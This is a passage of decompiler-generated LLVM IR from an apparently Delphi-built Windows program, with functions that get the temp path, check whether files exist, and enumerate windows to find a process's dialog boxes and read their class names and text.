  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1618
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1618
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1618
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1618
  br i1 %38, label %dec_label_pc_406ba9, label %dec_label_pc_406bd8, !insn.addr !1618

dec_label_pc_406bd8:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406b8e
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1599
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1619
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1620
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1620
  store i32 0, i32* %42, align 4, !insn.addr !1620
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1621
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1621
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1621
  store i32 %45, i32* %44, align 4, !insn.addr !1621
  %46 = call i32 @function_4034c8(), !insn.addr !1622
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1623
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1623
  store i32 %46, i32* %48, align 4, !insn.addr !1623
  %49 = call i32 @function_403720(), !insn.addr !1624
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1625
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1625
  store i32 %49, i32* %51, align 4, !insn.addr !1625
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1626
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1626
  store i32 %39, i32* %53, align 4, !insn.addr !1626
  %54 = call i32 @function_40446c(), !insn.addr !1627
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1628
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1628
  store i32 %39, i32* %56, align 4, !insn.addr !1628
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1629
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1630
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1630
  store i32 %39, i32* %59, align 4, !insn.addr !1630
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1631
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1632
  br label %dec_label_pc_406c0d, !insn.addr !1632

dec_label_pc_406c0d:                              ; preds = %dec_label_pc_406bd8, %dec_label_pc_406b52, %dec_label_pc_406b24
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1633
  %62 = load i32, i32* %61, align 4, !insn.addr !1633
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1634
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1635
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1635
  store i32 4221999, i32* %64, align 4, !insn.addr !1635
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1636
  ret i32 %65, !insn.addr !1637
}

define i32 @function_406c28() local_unnamed_addr {
dec_label_pc_406c28:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1638
  ret i32 %0, !insn.addr !1638
}

define i32 @function_406c2d() local_unnamed_addr {
dec_label_pc_406c2d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1639
}

define i32 @function_406c2f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406c2f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1640
}

define i32 @function_406c64() local_unnamed_addr {
dec_label_pc_406c64:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1641
  %1 = call i32 @function_4036b8(), !insn.addr !1642
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1643
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1643
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1643
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1644
  %4 = call i32 @function_403c90(), !insn.addr !1645
  %5 = icmp slt i32 %4, 0, !insn.addr !1646
  br i1 %5, label %dec_label_pc_406cec, label %dec_label_pc_406cba, !insn.addr !1647

dec_label_pc_406cba:                              ; preds = %dec_label_pc_406c64
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1648
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1649
  br label %dec_label_pc_406d38

dec_label_pc_406cec:                              ; preds = %dec_label_pc_406c64
  %8 = call i32 @function_403c88(), !insn.addr !1650
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1651
  %10 = call i32 @function_403c90(), !insn.addr !1652
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1653
  %12 = call i32 @function_403c90(), !insn.addr !1654
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1655
  %14 = call i32 @function_406b24(), !insn.addr !1656
  br label %dec_label_pc_406d38, !insn.addr !1656

dec_label_pc_406d38:                              ; preds = %dec_label_pc_406cba, %dec_label_pc_406cec
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1657
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1658
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1659
  ret i32 %16, !insn.addr !1660
}

define i32 @function_406d53() local_unnamed_addr {
dec_label_pc_406d53:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1661
  ret i32 %0, !insn.addr !1661
}

define i32 @function_406d58() local_unnamed_addr {
dec_label_pc_406d58:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1662
}

define i32 @function_406d5a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406d5a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1663
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1663
  %3 = load i32, i32* %2, align 4, !insn.addr !1663
  ret i32 %3, !insn.addr !1664
}

define i32 @function_406d64() local_unnamed_addr {
dec_label_pc_406d64:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1665
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1665
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1665
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1666
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1667
  %3 = add i32 %2, 1, !insn.addr !1667
  %4 = icmp eq i32 %3, 0, !insn.addr !1667
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1667
  %5 = icmp eq i1 %4, false, !insn.addr !1668
  br i1 %5, label %dec_label_pc_406d9c, label %dec_label_pc_406d7d, !insn.addr !1668

dec_label_pc_406d7d:                              ; preds = %dec_label_pc_406d64
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1669
  %7 = icmp eq i32 %6, 0, !insn.addr !1669
  br i1 %7, label %dec_label_pc_406d8c, label %dec_label_pc_406d87, !insn.addr !1670

dec_label_pc_406d87:                              ; preds = %dec_label_pc_406d7d
  %8 = call i32 @function_406b24(), !insn.addr !1671
  br label %dec_label_pc_406d8c, !insn.addr !1671

dec_label_pc_406d8c:                              ; preds = %dec_label_pc_406d87, %dec_label_pc_406d7d
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1672
  br label %dec_label_pc_406d9c, !insn.addr !1672

dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d8c, %dec_label_pc_406d64
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1673
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1674
  ret i32 0, !insn.addr !1675
}

define i32 @function_406daa() local_unnamed_addr {
dec_label_pc_406daa:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1676
  ret i32 %0, !insn.addr !1676
}

define i32 @function_406daf() local_unnamed_addr {
dec_label_pc_406daf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1677
}

define i32 @function_406db1(i32 %arg1) local_unnamed_addr {
dec_label_pc_406db1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1678
}

define i32 @function_406db4() local_unnamed_addr {
dec_label_pc_406db4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1679
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1679
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1679
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1680
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1681
  %3 = add i32 %2, -1, !insn.addr !1681
  %4 = icmp eq i32 %2, 0, !insn.addr !1681
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1681
  %5 = icmp eq i1 %4, false, !insn.addr !1682
  br i1 %5, label %dec_label_pc_406de8, label %dec_label_pc_406dce, !insn.addr !1682

dec_label_pc_406dce:                              ; preds = %dec_label_pc_406db4
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1683
  br label %dec_label_pc_406de8, !insn.addr !1684

dec_label_pc_406de8:                              ; preds = %dec_label_pc_406dce, %dec_label_pc_406db4
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1685
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1686
  ret i32 0, !insn.addr !1687
}

define i32 @function_406df6() local_unnamed_addr {
dec_label_pc_406df6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1688
  ret i32 %0, !insn.addr !1688
}

define i32 @function_406dfb() local_unnamed_addr {
dec_label_pc_406dfb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1689
}

define i32 @function_406dfd(i32 %arg1) local_unnamed_addr {
dec_label_pc_406dfd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1690
}

define i1 @function_406e00(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406e00:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1691
  ret i1 %0, !insn.addr !1691
}

define i32 @function_406e08() local_unnamed_addr {
dec_label_pc_406e08:
  %eax.0.reg2mem = alloca i32, !insn.addr !1692
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1693
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1694
  %2 = icmp eq i32 %1, 0, !insn.addr !1695
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1696
  br i1 %2, label %dec_label_pc_406e3e, label %dec_label_pc_406e20, !insn.addr !1696

dec_label_pc_406e20:                              ; preds = %dec_label_pc_406e08
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1693
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1697
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1697
  %7 = load i8, i8* %6, align 1, !insn.addr !1697
  %8 = icmp eq i8 %7, 92, !insn.addr !1697
  br i1 %8, label %dec_label_pc_406e30, label %dec_label_pc_406e27, !insn.addr !1698

dec_label_pc_406e27:                              ; preds = %dec_label_pc_406e20
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1699
  store i8 92, i8* %9, align 1, !insn.addr !1699
  %10 = or i32 %3, 1, !insn.addr !1700
  %11 = add i32 %1, %10, !insn.addr !1700
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1700
  store i8 0, i8* %12, align 1, !insn.addr !1700
  br label %dec_label_pc_406e30, !insn.addr !1700

dec_label_pc_406e30:                              ; preds = %dec_label_pc_406e27, %dec_label_pc_406e20
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1701
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1701
  br label %dec_label_pc_406e3e, !insn.addr !1701

dec_label_pc_406e3e:                              ; preds = %dec_label_pc_406e30, %dec_label_pc_406e08
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1702
}

define i32 @function_406e48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406e48:
  %esp.0.reg2mem = alloca i32, !insn.addr !1703
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1704
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1705
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1705
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1705
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1706
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1707
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1707
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1708
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1708
  %5 = icmp eq i1 %4, false, !insn.addr !1709
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1710
  br i1 %5, label %dec_label_pc_406eff, label %dec_label_pc_406e7f, !insn.addr !1710

dec_label_pc_406e7f:                              ; preds = %dec_label_pc_406e48
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1711
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1711
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1712
  %8 = icmp eq i32 %7, 32770, !insn.addr !1713
  %9 = icmp eq i1 %8, false, !insn.addr !1714
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1714
  br i1 %9, label %dec_label_pc_406eff, label %dec_label_pc_406e8e, !insn.addr !1714

dec_label_pc_406e8e:                              ; preds = %dec_label_pc_406e7f
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1715
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1715
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1716
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1716
  %13 = add i32 %arg1, 4, !insn.addr !1717
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1717
  %15 = load i32, i32* %14, align 4, !insn.addr !1717
  %16 = icmp eq i32 %15, %12, !insn.addr !1717
  %17 = icmp eq i1 %16, false, !insn.addr !1718
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1718
  br i1 %17, label %dec_label_pc_406eff, label %dec_label_pc_406e99, !insn.addr !1718

dec_label_pc_406e99:                              ; preds = %dec_label_pc_406e8e
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1719
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1719
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1720
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1721
  %21 = load i32, i32* %20, align 4, !insn.addr !1721
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1722
  %23 = icmp eq i32 %21, %22, !insn.addr !1722
  %24 = icmp eq i1 %23, false, !insn.addr !1723
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1723
  br i1 %24, label %dec_label_pc_406eff, label %dec_label_pc_406eaa, !insn.addr !1723

dec_label_pc_406eaa:                              ; preds = %dec_label_pc_406e99
  %25 = add i32 %arg1, 8, !insn.addr !1724
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1724
  %27 = load i32, i32* %26, align 4, !insn.addr !1724
  %28 = icmp eq i32 %27, 0, !insn.addr !1724
  br i1 %28, label %dec_label_pc_406ed4, label %dec_label_pc_406eb0, !insn.addr !1725

dec_label_pc_406eb0:                              ; preds = %dec_label_pc_406eaa
  %29 = call i32 @function_407020(), !insn.addr !1726
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1727
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1728
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406eff

dec_label_pc_406ed4:                              ; preds = %dec_label_pc_406eaa
  %32 = add i32 %arg1, 12, !insn.addr !1729
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1729
  %34 = load i32, i32* %33, align 4, !insn.addr !1729
  %35 = add i32 %arg1, 16, !insn.addr !1730
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1730
  %37 = load i32, i32* %36, align 4, !insn.addr !1730
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1731
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1731
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1731
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1731
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1731
  %43 = add i32 %arg1, 24, !insn.addr !1732
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1732
  store i32 %42, i32* %44, align 4, !insn.addr !1732
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1733
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1733
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1734
  %47 = icmp eq i1 %46, false, !insn.addr !1735
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1736
  br i1 %47, label %dec_label_pc_406eff, label %dec_label_pc_406efa, !insn.addr !1736

dec_label_pc_406efa:                              ; preds = %dec_label_pc_406ed4
  %48 = add i32 %arg1, 20, !insn.addr !1737
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1737
  store i32 %arg2, i32* %49, align 4, !insn.addr !1737
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1738
  br label %dec_label_pc_406eff, !insn.addr !1738

dec_label_pc_406eff:                              ; preds = %dec_label_pc_406eb0, %dec_label_pc_406efa, %dec_label_pc_406ed4, %dec_label_pc_406e99, %dec_label_pc_406e8e, %dec_label_pc_406e7f, %dec_label_pc_406e48
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1739
  %51 = load i32, i32* %50, align 4, !insn.addr !1739
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1740
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1741
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1741
  store i32 4222753, i32* %53, align 4, !insn.addr !1741
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1742
  ret i32 %54, !insn.addr !1743
}

define i32 @function_406f1a() local_unnamed_addr {
dec_label_pc_406f1a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1744
  ret i32 %0, !insn.addr !1744
}

define i32 @function_406f1f() local_unnamed_addr {
dec_label_pc_406f1f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1745
}

define i32 @function_406f21(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f21:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1746
}

define i32 @function_406f2c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f2c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1747
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1748
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1749
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1749
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1749
  %6 = call i32 @function_40441c(), !insn.addr !1750
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1751
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1752
  br label %dec_label_pc_406f70, !insn.addr !1752

dec_label_pc_406f70:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f2c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1751
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1751
  store i32 %7, i32* %9, align 4, !insn.addr !1751
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1753
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1753
  store i32 4222536, i32* %11, align 4, !insn.addr !1753
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1754
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1755
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1755
  store i32 1, i32* %14, align 4, !insn.addr !1755
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1756
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1757
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1757
  store i32 0, i32* %16, align 4, !insn.addr !1757
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1758
  %18 = icmp eq i1 %17, false, !insn.addr !1759
  %19 = icmp eq i1 %18, false, !insn.addr !1760
  br i1 %19, label %dec_label_pc_406f9a, label %dec_label_pc_406f8f, !insn.addr !1760

dec_label_pc_406f8f:                              ; preds = %dec_label_pc_406f70
  %20 = call i32 @function_40441c(), !insn.addr !1761
  %21 = sub i32 %20, %6, !insn.addr !1762
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1763
  %23 = icmp eq i1 %22, false, !insn.addr !1764
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1764
  br i1 %23, label %dec_label_pc_406f70, label %dec_label_pc_406f9a, !insn.addr !1764

dec_label_pc_406f9a:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f70
  ret i32 0, !insn.addr !1765
}

define i32 @function_406fb4() local_unnamed_addr {
dec_label_pc_406fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1766
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1767
}

define i32 @function_406fcc(i32 %arg1) local_unnamed_addr {
dec_label_pc_406fcc:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1768
  %edi.0.reg2mem = alloca i32, !insn.addr !1768
  %ecx.0.reg2mem = alloca i32, !insn.addr !1768
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1769
  br label %2, !insn.addr !1769

; <label>:2:                                      ; preds = %4, %dec_label_pc_406fcc
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1769
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1769
  br i1 %3, label %10, label %4, !insn.addr !1769

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1769
  %6 = load i8, i8* %5, align 1, !insn.addr !1769
  %7 = icmp eq i8 %6, 0, !insn.addr !1769
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1769
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1769
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1769
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1769
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1769
  br i1 %7, label %10, label %2, !insn.addr !1769

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1770
  ret i32 %11, !insn.addr !1771
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_407020() local_unnamed_addr {
dec_label_pc_407020:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1772
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1773
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1773
  %4 = add i32 %3, %1, !insn.addr !1774
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1774
  store i8 0, i8* %5, align 1, !insn.addr !1774
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1775
  ret i32 %6, !insn.addr !1776
}

define i32 @function_407054() local_unnamed_addr {
dec_label_pc_407054:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1777
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1778
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1779
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1779
  %6 = add i32 %5, %3, !insn.addr !1780
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1780
  store i8 0, i8* %7, align 1, !insn.addr !1780
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1781
  ret i32 %8, !insn.addr !1782
}

define i32 @function_40708c() local_unnamed_addr {
dec_label_pc_40708c:
  %0 = call i32 @function_4034c8(), !insn.addr !1783
  %1 = call i32 @function_4034c8(), !insn.addr !1784
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1785
  ret i32 %2, !insn.addr !1786
}

define i32 @function_4070cc() local_unnamed_addr {
dec_label_pc_4070cc:
  %0 = call i32 @function_4034c8(), !insn.addr !1787
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1788
  ret i32 %1, !insn.addr !1789
}

define i32 @function_407104() local_unnamed_addr {
dec_label_pc_407104:
  %0 = call i32 @function_4036c8(), !insn.addr !1790
  %1 = call i32 @function_4036c8(), !insn.addr !1791
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1792
  %3 = icmp eq i32 %2, 2, !insn.addr !1793
  %4 = zext i1 %3 to i32, !insn.addr !1794
  %5 = and i32 %2, -256, !insn.addr !1794
  %6 = or i32 %5, %4, !insn.addr !1794
  ret i32 %6, !insn.addr !1795
}

define i32 @function_407134() local_unnamed_addr {
dec_label_pc_407134:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1796
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1796
  %esp.02.reg2mem = alloca i32, !insn.addr !1796
  %storemerge3.reg2mem = alloca i32, !insn.addr !1796
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1797
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1797
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1797
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1798
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1799
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1800
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1800
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1801
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1801
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1801
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1802
  %9 = icmp eq i1 %8, false, !insn.addr !1803
  %10 = icmp eq i1 %9, false, !insn.addr !1804
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1804
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1804
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1804
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1804
  br i1 %10, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1804

dec_label_pc_407158:                              ; preds = %dec_label_pc_407134, %dec_label_pc_407158
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_407020(), !insn.addr !1805
  %12 = call i32 @function_407134(), !insn.addr !1806
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1807
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1807
  store i32 2, i32* %14, align 4, !insn.addr !1807
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1808
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1808
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1808
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1809
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1801
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1801
